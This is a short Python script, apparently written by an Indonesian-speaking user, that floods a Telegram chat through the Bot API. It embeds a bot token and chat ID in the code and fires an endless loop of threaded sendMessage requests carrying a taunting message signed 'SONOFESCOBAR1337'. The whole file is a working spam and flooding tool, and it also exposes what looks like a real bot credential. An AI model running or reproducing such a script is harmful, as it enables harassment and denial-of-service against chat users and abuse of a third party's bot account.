import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor


def make_http_request(request_number):


    with requests.Session() as session:
        try:
            response = session.post(
                'https://api.telegram.org/bot6405005257:AAEByrxD0CoeSJGgWv4butnGwxATsRKtlLY/sendMessage',
                params={
                    'parse_mode': 'markdown',
                    'chat_id': '6656200257',
                    'text': f'MENDING TOBAT BANG AWOWKOWKOWKOWKWOKWOK BY SONOFESCOBAR1337'
                },
                timeout=10
            )

            response_json = response.json()
            if 'result' in response_json and 'message_id' in response_json['result']:
                print(f"teks sukses bang msgid : {response_json['result']['message_id']}")
            else:
                print("request timeout bang")
        except Exception as e:
            print("request timeout bang")


num_threads = int(input("Masukkan jumlah thread yang ingin digunakan: "))


with ThreadPoolExecutor(max_workers=num_threads) as executor:
    request_count = 0
    while True:
        request_count += 1
        executor.submit(make_http_request, request_count)